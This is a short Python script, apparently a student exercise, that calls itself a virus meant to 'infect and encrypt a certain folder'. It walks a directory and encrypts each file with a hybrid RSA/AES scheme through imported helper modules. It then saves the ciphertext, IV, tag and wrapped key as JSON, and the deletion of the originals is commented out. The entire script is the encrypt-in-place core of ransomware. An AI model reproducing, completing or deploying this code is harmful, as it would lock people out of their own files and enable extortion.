from fileEncryptMAC import MyencryptMAC, MydecryptMAC, MyFileEncryptMAC, MyFileDecryptMAC
from fileEncryptRSA import generateKeyPair, MyRSAencrypt, MyRSAdecrypt

import os
import json, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives.asymmetric.padding import MGF1 as uno
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_ssh_public_key
from pathlib import Path #used to get file ext

'''
Making a VIRUS that infect and encrypt a certain folder
'''

print("RSAEncrypt and RSADecrypt")
pub_key = "/Users/Phuc Nguyen/Desktop/FinalTesting/SHREKISLOVESHREKISLIFE555/publicKey.pem"
dir_path = "/Users/Phuc Nguyen/Desktop/Testing"
os.chdir(dir_path)
cwd = os.getcwd()
print("Current directory:" + cwd)

def infection():
    jason={}

    for root, dirs, files in os.walk(cwd):
        for filename in files:
            print("Encrypting " + filename + "...") 
            RSACipher, C, IV, ext, tag = MyRSAencrypt(filename, pub_key )
            #print(type(C))
            fname = os.path.splitext(str(filename))[0]
            #print(type(C))
            jas = {}
            jas[fname] = []
            ascii_rsa = base64.b64encode(RSACipher).decode('ascii')
            ascii_C   = base64.b64encode(C).decode('ascii')
            ascii_tag = base64.b64encode(tag).decode('ascii')
            ascii_iv  = base64.b64encode(IV).decode('ascii')
            ascii_ext = ext
            '''
            jas[fname].append({

                "RSACipher":ascii_rsa,
                "C": ascii_C,
                "IV": ascii_tag,
                "ext": ascii_ext,
                "tag": ascii_tag
             })
            '''
            jason = json.dumps({"RSA":ascii_rsa, "C":ascii_C, "Tag":ascii_tag, "IV":ascii_iv, "Ext":ascii_ext})
             
            #jason.update(jas)
            #fname = os.path.splitext(filename)[0]
            jsonFile = fname + ".json"
            with open(jsonFile, 'w') as outfile: #Writes to json 
                #json.dump(jason, outfile)
                outfile.write(jason)
                outfile.close()
            #os.remove(filename)
      

# testing
infection()
